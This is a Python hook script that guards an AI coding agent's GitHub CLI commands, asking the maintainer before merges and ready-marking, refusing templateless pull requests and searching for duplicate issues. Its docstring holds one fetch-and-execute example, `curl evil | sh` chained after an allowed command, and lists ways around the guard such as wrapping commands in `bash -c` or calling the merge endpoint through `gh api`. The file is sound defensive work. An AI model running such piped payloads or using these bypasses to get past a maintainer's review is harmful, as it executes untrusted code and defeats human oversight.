#!/usr/bin/env python3
"""PreToolUse guard for the tracker commands that skip a review step.

Four failures cost this project real work, and every one of them is a
shell command an agent runs without stopping:

- `gh pr ready` with no review cycle. PR #64 and PR #100 both reached
  ready without one, and both cycles then found defects.
- `gh pr merge` before the Copilot review is read. PR #156 merged 54
  seconds after the review posted, PR #176 five minutes after, and
  #176's flag was real.
- `gh pr create --body`, which bypasses the template silently. The
  title becomes the squash subject and release-please parses the body
  footers, so a freeform body breaks machinery rather than style.
- `gh issue create` with no prior search. Five sessions filed one
  runlog bug five times (#151, #155, #157, #185, #205).

**One rule per verifiable check, ruled 2026-08-15 on #246.** The guard
asked all four, and a measured session approved three prompts without
reading them. An unverifiable question fails at any frequency: the
guard cannot check whether a search ran, the maintainer cannot check
it at the prompt, and answering yes costs nothing. So each rule now
routes by whether its check is mechanical.

| rule | decision | who reads it |
|------|----------|--------------|
| `gh pr merge` | `ask` | the maintainer |
| `gh pr ready` | `ask` | the maintainer |
| `gh pr create` without `--body-file` | `deny` | the agent |
| `gh issue create` | context, no decision | the agent |

The two merge-shaped rules ask, because they are the maintainer's
decision and they fire about once per pull request. The `--body-file`
rule refuses, because its condition reads off the command line. The
`gh issue create` rule stopped asking and started answering: it runs
the tracker search itself and hands the matches to the agent.

**No rule emits `allow`.** `allow` skips the interactive permission
prompt for the whole tool call, not for the matched command, so
`gh issue create -t x && curl evil | sh` would have inherited the
grant. `.claude/settings.json` ships with this repository and carries
no permissions block, so a fresh clone has no allowlist to bound it.
The `gh issue create` rule emits `additionalContext` with no decision,
which the normal permission flow still governs.

**One rule refuses, so the guard now enforces in one place.** The
other three remind. A refusal an agent cannot override costs more than
a prompt when it misfires, which is why the matching below is
conservative and why `--help` is exempt.

Field routing measured on Claude Code 2.1.233 (#246).
`additionalContext` reaches the agent with `allow` and with no
decision at all. `deny` plus `permissionDecisionReason` reaches the
agent. `ask` reaches only the maintainer, and `systemMessage` reaches
nobody. Re-measure before changing a decision value.

**What the guard does not catch, on purpose.** It reads one command
line and never a process tree. `gh api --method PUT
repos/o/r/pulls/N/merge` reaches the same endpoint. A command inside
`bash -c "..."`, `$(...)`, or backticks stays one token and does not
fire, because reaching into a quoted string is what made an earlier
version refuse documentation that merely named a command. Chasing
every bypass is how a reminder becomes noise.

It fails open. A malformed payload allows the command, a failed search
reports that it failed, and an uncaught error exits non-zero, which
Claude Code reports without blocking the tool.

Examples:
    The guard reads one PreToolUse payload on stdin and answers with a
    permission decision:

    ```console
    $ echo '{"tool_input": {"command": "gh pr merge 1"}}' \
        | python3 .claude/hooks/pr_guard.py
    {"hookSpecificOutput": {"hookEventName": "PreToolUse",
     "permissionDecision": "ask", "permissionDecisionReason": "..."}}
    ```

    An unguarded command prints nothing and exits 0:

    ```console
    $ echo '{"tool_input": {"command": "uv run pytest"}}' \
        | python3 .claude/hooks/pr_guard.py
    ```

See Also:
    - `.claude/settings.json`: Registers this guard on the Bash tool.
    - `.claude/commands/board.md`: The `/board` command, which answers
      where a session should go before any of these commands run.
"""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import subprocess
import sys
from typing import Final, NamedTuple

# Most restrictive wins when one command matches several rules,
# because the payload carries one decision.
#
# `inform` is not a Claude Code decision value. It names a rule whose
# text travels in `additionalContext`, which is an independent key. So
# an `inform` rule still reports even when a stricter rule decides.
_RANK: Final[dict[str, int]] = {"inform": 1, "ask": 2, "deny": 3}

# The tracker search runs inside a PreToolUse hook, and
# `.claude/settings.json` allows the hook 5 seconds. One search runs
# per command, whatever the segment count, so the worst case stays
# inside the budget. A hook that overruns loses its decision too.
_SEARCH_TIMEOUT_SECONDS: Final[float] = 3.0
_SEARCH_LIMIT: Final[int] = 5

# A command asking for its own documentation changes nothing, and a
# refusal would stop an agent reading the flags this guard is about.
_HELP_FLAGS: Final[frozenset[str]] = frozenset({"--help", "-h"})

# Words too common to narrow a tracker search.
_STOPWORDS: Final[frozenset[str]] = frozenset(
    {
        "a", "an", "and", "are", "as", "at", "be", "but", "by", "does",
        "for", "from", "has", "have", "in", "into", "is", "it", "its",
        "no", "not", "of", "on", "or", "so", "than", "that", "the",
        "then", "to", "was", "what", "when", "which", "with", "without",
    }
)  # fmt: skip
_MIN_TERM_LEN: Final[int] = 3
_MAX_TERMS: Final[int] = 6

# Shell operators that separate one command from the next, as tokens.
# The guard reads each segment alone, so a later command never disarms
# an earlier one.
#
# A newline is absent on purpose. `shlex` reads an unescaped newline
# as whitespace, so the only `\n` token it emits comes from a
# backslash continuation, which joins one command rather than ending
# it.
_SEPARATOR_TOKENS: Final[frozenset[str]] = frozenset({"&&", "||", ";", "|"})

# The same operators as raw text, for the fallback path only.
_SEPARATORS: Final[re.Pattern[str]] = re.compile(r"&&|\|\||;|\n|\|")

# A backslash before a newline continues one command onto the next
# line. `shlex` already handles it, so only the fallback needs this.
_CONTINUATION: Final[re.Pattern[str]] = re.compile(r"\\\s*\n")

# A heredoc introducer and its terminator. `shlex` knows nothing about
# heredocs, so it tokenizes the payload as if it were commands. A
# script that merely quoted a guarded command was refused (#246), so
# the payload is removed before anything reads it.
_HEREDOC: Final[re.Pattern[str]] = re.compile(
    r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1"
)

_ISSUE_CREATE_VERB: Final[tuple[str, ...]] = ("gh", "issue", "create")


class Rule(NamedTuple):
    """One guarded command shape.

    Attributes:
        verb (tuple[str, ...]): The command words, matched as
            consecutive tokens.
        pattern (re.Pattern[str]): The same words anchored to the
            start of a segment, used only when a command cannot be
            tokenized.
        disarm (frozenset[str]): Flags that silence the rule when one
            appears as its own token in the same segment. Empty when
            nothing silences it.
        decision (str): ``ask``, ``deny``, or ``inform``. Only the
            first two name a Claude Code permission decision.
        text (str): The text the decision carries.
    """

    verb: tuple[str, ...]
    pattern: re.Pattern[str]
    disarm: frozenset[str]
    decision: str
    text: str


def rule(verb: str, disarm: tuple[str, ...], decision: str, text: str) -> Rule:
    """Build one rule from its command words.

    Args:
        verb: The command words, space separated, e.g. ``gh pr merge``.
        disarm: Flags that silence the rule, including every alias.
        decision: ``ask``, ``deny``, or ``inform``.
        text: The text the decision carries.

    Returns:
        The rule, carrying both matchers.
    """
    words = tuple(verb.split())
    escaped = r"\s+".join(re.escape(w) for w in words)
    # Anchored on purpose. The fallback runs on raw text, where an
    # unanchored search matches a mention inside prose or backticks.
    return Rule(
        words, re.compile(rf"^\s*{escaped}\b"), frozenset(disarm), decision, text
    )


_RULES: Final[tuple[Rule, ...]] = (
    rule(
        "gh pr merge",
        (),
        "ask",
        (
            "Has the Copilot review posted, and is every comment answered?\n"
            "PR #156 merged 54 seconds after the review posted. PR #176 "
            "merged five minutes after, and its flag was real."
        ),
    ),
    rule(
        "gh pr ready",
        (),
        "ask",
        (
            "Has the review cycle run on this diff?\n"
            "Fact-check every number, then peer-review for strict-mode "
            "style. Docs-only PRs are not exempt. PR #64 and PR #100 "
            "skipped it, and both times it found defects."
        ),
    ),
    rule(
        "gh pr create",
        ("--body-file", "-F"),
        "deny",
        (
            "Refused: `gh pr create` without `--body-file`.\n"
            "The flag bypasses .github/PULL_REQUEST_TEMPLATE.md "
            "silently. The title becomes the squash subject and "
            "release-please parses the body footers, so a freeform body "
            "breaks machinery rather than style. Write the body to a "
            "file, then pass --body-file."
        ),
    ),
    rule("gh issue create", (), "inform", ""),
)


def strip_heredocs(command: str) -> str:
    """Remove every heredoc payload from a command line.

    `shlex` knows nothing about heredocs, so it reads the payload as
    commands. A Python script quoting a guarded command was refused
    for that reason (#246). The introducer stays, so the command still
    parses.

    Args:
        command: The full command line the tool would run.

    Returns:
        The command with each heredoc body and terminator removed.
    """
    out = command
    for match in reversed(list(_HEREDOC.finditer(command))):
        terminator = match.group(2)
        body = re.compile(rf"\n.*?\n\s*{re.escape(terminator)}\s*(?=\n|$)", re.DOTALL)
        tail = body.search(out, match.end())
        if tail is not None:
            out = out[: tail.start()] + out[tail.end() :]
    return out


def tokens(segment: str) -> list[str]:
    """Split one shell segment into tokens.

    Quoting matters here. A `--body-file` inside a quoted message is
    one token's content, never a flag.

    Args:
        segment: One shell command, without separators.

    Returns:
        The tokens, or an empty list when the segment carries
        unbalanced quotes.
    """
    try:
        return shlex.split(segment)
    except ValueError:
        return []


def segments(command: str) -> list[tuple[str, list[str]]]:
    """Split one command line into its independent commands.

    Tokenizing first is what makes this safe. A quoted argument stays
    one token however many newlines or operators it carries, so a
    commit message naming a guarded command never reads as that
    command. Splitting raw text first tore such an argument into fake
    segments, and a prose line opening with the verb then matched
    (#246).

    Args:
        command: The full command line the tool would run.

    Returns:
        One ``(segment, tokens)`` pair per command. A command the
        shell grammar cannot parse yields raw segments with no tokens,
        which sends the caller to the anchored regex.
    """
    stripped = strip_heredocs(command)
    present = tokens(stripped)
    if not present:
        joined = _CONTINUATION.sub(" ", stripped)
        return [(segment, []) for segment in _SEPARATORS.split(joined)]
    out: list[tuple[str, list[str]]] = []
    current: list[str] = []
    for token in present:
        if token in _SEPARATOR_TOKENS:
            out.append((" ".join(current), current))
            current = []
        else:
            current.append(token)
    out.append((" ".join(current), current))
    return out


def has_verb(present: list[str], verb: tuple[str, ...]) -> bool:
    """Report whether the tokens carry the verb as consecutive words.

    Token matching keeps a quoted mention from firing a rule.
    ``echo "gh pr create"`` is one token after `shlex`, so it names no
    command. A raw-text search matched it and refused the work, which
    the `deny` decision made expensive (#246).

    The first word compares by base name, so an absolute or relative
    path to the tool still fires.

    Args:
        present: Tokens of one shell segment.
        verb: The command words to find.

    Returns:
        True when the tokens contain the verb in order.
    """
    span = len(verb)
    for index in range(len(present) - span + 1):
        window = present[index : index + span]
        if os.path.basename(window[0]) == verb[0] and tuple(window[1:]) == verb[1:]:
            return True
    return False


def disarmed(present: list[str], flags: frozenset[str]) -> bool:
    """Report whether a segment carries a flag that silences its rule.

    `gh` spells the body file three ways: ``--body-file b.md``,
    ``--body-file=b.md``, and ``-F b.md``. An exact-token test saw
    only the first and refused the other two (#246).

    Args:
        present: Tokens of one shell segment.
        flags: Every spelling that silences the rule.

    Returns:
        True when any spelling appears.
    """
    return any(token.split("=", 1)[0] in flags for token in present)


def title_of(present: list[str]) -> str | None:
    """Read the issue title from one segment's tokens.

    Args:
        present: Tokens of one shell segment.

    Returns:
        The title, or None when the segment names none.
    """
    for flag in ("--title", "-t"):
        if flag in present:
            index = present.index(flag)
            if index + 1 < len(present):
                return present[index + 1]
    for token in present:
        if token.startswith("--title="):
            return token.split("=", 1)[1]
    return None


def search_terms(title: str) -> list[str]:
    """Reduce a title to the words worth searching.

    Args:
        title: The issue title as written.

    Returns:
        Up to `_MAX_TERMS` lowercase words, longest first, without
        stopwords. Empty when the title carries none.
    """
    words = re.findall(r"[A-Za-z_][A-Za-z0-9_]*", title.lower())
    keep = [w for w in words if len(w) >= _MIN_TERM_LEN and w not in _STOPWORDS]
    return sorted(set(keep), key=len, reverse=True)[:_MAX_TERMS]


class _SearchFailed(Exception):
    """The tracker search produced no answer.

    Carries the sentence the agent reads. A failed search must never
    read as a clean bill of health, so every cause names itself (#246).
    """


_ROW_FIELDS: Final[frozenset[str]] = frozenset({"number", "title", "state"})


def _search(terms: list[str]) -> list[dict]:
    """Run one tracker search and return its validated rows.

    Args:
        terms: The words to search.

    Returns:
        The matching rows, each carrying every field `_describe` reads.

    Raises:
        _SearchFailed: If the search cannot run, exits non-zero, or
            returns anything other than a list of complete rows.
    """
    gh = shutil.which("gh")
    if gh is None:
        raise _SearchFailed("Tracker search skipped: gh is not on PATH.")
    try:
        completed = subprocess.run(  # noqa: S603 - fixed argv, no shell
            [
                gh, "issue", "list", "--state", "all",
                "--search", " ".join(terms),
                "--limit", str(_SEARCH_LIMIT),
                "--json", "number,title,state",
            ],
            capture_output=True,
            encoding="utf-8",
            errors="replace",
            check=False,
            timeout=_SEARCH_TIMEOUT_SECONDS,
        )  # fmt: skip
    except subprocess.TimeoutExpired as exc:
        raise _SearchFailed(
            f"Tracker search timed out after {_SEARCH_TIMEOUT_SECONDS:g} s."
        ) from exc
    except (OSError, subprocess.SubprocessError) as exc:
        raise _SearchFailed(f"Tracker search could not start: {exc}.") from exc
    if completed.returncode != 0:
        # `gh` explains itself on stderr. Dropping that turned nine
        # causes into one message, and "run gh auth login" needs a
        # different answer from "the network is down".
        detail = (completed.stderr or "").strip().splitlines()
        why = detail[0] if detail else "no explanation on stderr"
        raise _SearchFailed(
            f"Tracker search failed, gh exit {completed.returncode}: {why}."
        )
    try:
        matches = json.loads(completed.stdout)
    except ValueError as exc:
        raise _SearchFailed("Tracker search returned unparseable output.") from exc
    # A truthy non-list body once crashed the hook, and a falsy one
    # read as "found nothing", which is the mislabel this rule exists
    # to prevent.
    rows = [m for m in matches] if isinstance(matches, list) else None
    if rows is None or any(
        not isinstance(m, dict) or not m.keys() >= _ROW_FIELDS for m in rows
    ):
        raise _SearchFailed("Tracker search returned an unexpected shape.")
    return rows


def _describe(matches: list[dict]) -> str:
    """Render the tracker matches for the agent.

    Args:
        matches: Validated ``gh issue list`` rows.

    Returns:
        One line per match, then what to do about them.
    """
    listed = "\n".join(
        f"  #{m['number']} [{str(m['state']).lower()}] {m['title']}" for m in matches
    )
    return (
        f"Tracker search found {len(matches)} match(es):\n{listed}\n"
        "Read them before filing. Five sessions filed one runlog bug five "
        "times (#151, #155, #157, #185, #205). Comment on a match instead, "
        "or say in the body why this one is distinct."
    )


def duplicate_report(title: str) -> str:
    """Search the tracker and describe what it found.

    The rule this serves used to ask whether a search had run. Nobody
    could verify that answer, so the guard runs the search instead
    (#246).

    Args:
        title: The issue title the command would file.

    Returns:
        Text for the agent. It names the matches, or names why the
        search produced none. Every sentence ends with what to do.
    """
    if not title:
        return "Tracker search skipped: the command names no title. Search first."
    terms = search_terms(title)
    if not terms:
        return (
            f'Tracker search skipped: no searchable words in "{title}". '
            "Search the tracker before filing."
        )
    try:
        matches = _search(terms)
    except _SearchFailed as exc:
        return f"{exc} Search before filing."
    if not matches:
        # "Filing looks new" asserted recall this search cannot
        # support. #205 reworded #151 and a title search misses it.
        return (
            f"Tracker search for {terms} matched no open or closed issue. "
            "This reads title text only and misses a re-worded duplicate. "
            "#205 was filed as a duplicate of #151 in different words."
        )
    return _describe(matches)


class Verdict(NamedTuple):
    """What the guard decided about one command.

    Attributes:
        decision (str): ``ask``, ``deny``, or ``inform``.
        reasons (list[str]): Text for an ``ask`` or ``deny``.
        context (list[str]): Text for the agent, which travels
            alongside any decision.
    """

    decision: str
    reasons: list[str]
    context: list[str]


def inspect(command: str) -> Verdict | None:
    """Decide what one shell command needs before it runs.

    The tracker search runs at most once per command, after every rule
    has matched. Running it per segment could spend three times the
    hook's whole budget, and a hook that overruns loses its decision
    (#246).

    Args:
        command: The full command line the tool would run.

    Returns:
        The verdict, or None when no rule matched.
    """
    reasons: list[str] = []
    decision: str | None = None
    title: str | None = None
    searched = False
    for segment, present in segments(command):
        if present and any(flag in present for flag in _HELP_FLAGS):
            continue
        for candidate in _RULES:
            # Tokens decide when the command parses. An unparseable
            # command yields none, and the anchored regex then catches
            # a guarded command that opens its segment. A prefixed one
            # escapes, which is the price of not refusing prose.
            hit = (
                has_verb(present, candidate.verb)
                if present
                else candidate.pattern.search(segment) is not None
            )
            if not hit:
                continue
            if candidate.disarm and disarmed(present, candidate.disarm):
                continue
            if decision is None or _RANK[candidate.decision] > _RANK[decision]:
                decision = candidate.decision
            if candidate.verb == _ISSUE_CREATE_VERB:
                searched = True
                title = title or title_of(present)
            elif candidate.text not in reasons:
                reasons.append(candidate.text)
    if decision is None:
        return None
    context = [duplicate_report(title or "")] if searched else []
    return Verdict(decision, reasons, context)


def main() -> int:
    """Read one PreToolUse payload from stdin and decide on it.

    Returns:
        Always 0. The decision travels in the JSON on stdout, and a
        malformed payload allows the command rather than stopping the
        work.
    """
    try:
        payload = json.load(sys.stdin)
        command = payload.get("tool_input", {}).get("command", "")
        verdict = inspect(command) if isinstance(command, str) else None
    except (ValueError, AttributeError, OSError):
        # `json.JSONDecodeError` and `UnicodeDecodeError` subclass
        # `ValueError`. A payload that is not a mapping raises
        # `AttributeError` on `.get`. A broken pipe raises `OSError`.
        return 0

    if verdict is None:
        return 0

    out: dict[str, str] = {"hookEventName": "PreToolUse"}
    # `additionalContext` is an independent key, so a search report
    # travels with an `ask` or a `deny` as readily as on its own.
    context = "\n\n".join(text for text in verdict.context if text)
    if context:
        out["additionalContext"] = context
    if verdict.decision != "inform":
        out["permissionDecision"] = verdict.decision
        if verdict.reasons:
            out["permissionDecisionReason"] = "\n\n".join(verdict.reasons)
    if len(out) == 1:
        # Nothing to say. An empty payload risks reading as a decision.
        return 0

    print(json.dumps({"hookSpecificOutput": out}))
    return 0


if __name__ == "__main__":
    sys.exit(main())
